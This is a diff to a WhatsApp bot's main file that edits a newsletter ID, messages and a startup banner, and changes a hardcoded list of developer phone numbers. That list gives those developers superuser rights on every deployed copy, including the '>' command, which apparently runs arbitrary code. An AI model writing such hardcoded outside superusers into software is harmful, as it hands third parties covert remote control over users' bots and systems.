@@ -214,7 +214,7 @@ zk.ev.on('call', async (callData) => {
     forwardingScore: 999,
     isForwarded: true,
     forwardedNewsletterMessageInfo: {
-      newsletterJid: "120363249464136503@newsletter",
+      newsletterJid: "120363276287415739@newsletter",
       newsletterName: "Beltah Tech Updates",
       serverMessageId: Math.floor(100000 + Math.random() * 900000),
     },
@@ -576,10 +576,10 @@ const getContextInfo1 = (title = '', userJid = '', thumbnailUrl = '', conf = {})
       } = require("./bdd/sudo");
       const nomAuteurMessage = ms.pushName;
       const sudo = await getAllSudoNumbers();
-      const superUserNumbers = [servBot, '254114141192',"254738625827","254759328581", conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+      const superUserNumbers = [servBot, '254114141192',"254737681758", conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
       const allAllowedNumbers = superUserNumbers.concat(sudo);
       const superUser = allAllowedNumbers.includes(auteurMessage);
-      var dev = ['254114141192',"254759328581",'254738625827'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+      var dev = ['254114141192','254737681758'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
       function repondre(mes) {
         zk.sendMessage(origineMessage, {
           text: mes
@@ -763,7 +763,7 @@ const getContextInfo1 = (title = '', userJid = '', thumbnailUrl = '', conf = {})
 if (texte && texte.startsWith('>')) {
   // If the sender is not the owner
   if (!superUser) {
-    const menuText = `Only Owner or Beltah can execute baileys codes.`;
+    const menuText = `Only Beltah Tech allowed execute baileys codes.`;
 
     await zk.sendMessage(origineMessage, {
       text: menuText,
@@ -1106,7 +1106,7 @@ if (verifCom) {
     try {
       // Restrict command execution based on bot mode and permissions
       if (conf.MODE.toLocaleLowerCase() !== 'yes' && !superUser) {
-        repondre("Command access restricted: Bot is in PRIVATE mode.");
+        repondre("_Input Ignored❗❗_");
         return;
       }
 
@@ -1337,12 +1337,13 @@ zk.ev.on('group-participants.update', async group => {
         console.log("Command installation completed ✅");
 
         if ((conf.DP).toLowerCase() === "yes") {
-            let cmsg = `╭═══════⩥
-║   Owner: *${conf.OWNER_NAME}*
-║   Prefix : [  ${prefixe}  ]
-║   Mode : ${md} MODE
-║   Plugins : ${evt.cm.length}
-╰═════════════⩥
+            let cmsg = `╭══════════⩥
+║ 🅰︎🅳︎🅼︎🅸︎🅽︎ :  *${conf.OWNER_NAME}*
+║ 🅿︎🆁︎🅴︎🆅︎🅸︎🅾︎ : [  ${prefixe}  ]
+║ 🅼︎🅾︎🅳︎🅴︎ :  ${md} MODE
+║ 🅿︎🅻︎🆄︎🅶︎🅸︎🅽︎🆂︎ : ${evt.cm.length}
+║ 🅿︎🅾︎🆆︎🅴︎🆁︎🅴︎🅳︎ : *BELTAH TECH TEAM*
+╰═══════════════⩥
 
 > ᴘᴏᴡᴇʀᴇᴅ ʙʏ ʙᴇʟᴛᴀʜ ᴛᴇᴄʜ © 2025`;
             await zk.sendMessage(zk.user.id, {
